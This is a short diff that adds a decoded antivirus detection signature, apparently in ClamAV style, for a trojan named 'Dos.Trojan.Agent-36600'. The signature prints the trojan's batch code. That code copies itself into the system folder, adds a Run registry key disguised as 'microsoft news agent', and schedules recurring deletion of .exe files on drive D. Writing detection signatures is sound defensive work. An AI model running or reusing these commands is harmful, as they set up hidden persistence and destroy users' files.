@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36600
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off copy microsoft_news_agent.bat %systemroot%\57.bat reg add "hkcu\software\microsoft\windows\currentversion\run" /v microsoft news agent /t reg_sz /d "%systemroot%\57.bat" at / every:4,8,15,16,23,30 cmd /c if exist d:\*.exe del d:\*.exe
